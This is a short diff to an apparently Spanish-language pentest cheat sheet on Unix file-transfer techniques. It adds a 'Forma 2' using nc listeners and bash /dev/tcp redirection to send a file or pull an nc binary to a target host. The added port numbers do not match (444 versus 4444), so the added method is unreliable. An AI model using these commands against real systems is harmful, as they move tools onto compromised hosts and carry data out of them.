@@ -180,7 +180,12 @@ Técnicas para utilizar en sistemas basados en unix
 ### Dev tcp
   ```bash
   target -> nc -lvp 4444 > FileToTransfer
-  cat FileToTransfer > /dev/tcp/targetip/4444 
+  source cat FileToTransfer > /dev/tcp/targetip/4444 
+  
+  ## Forma 2 
+  source nc -nlvp 444 > nc 
+  target cat > nc < /dev/tcp/targetip/4444
+  
   ```
 ### FTP
   ```bash
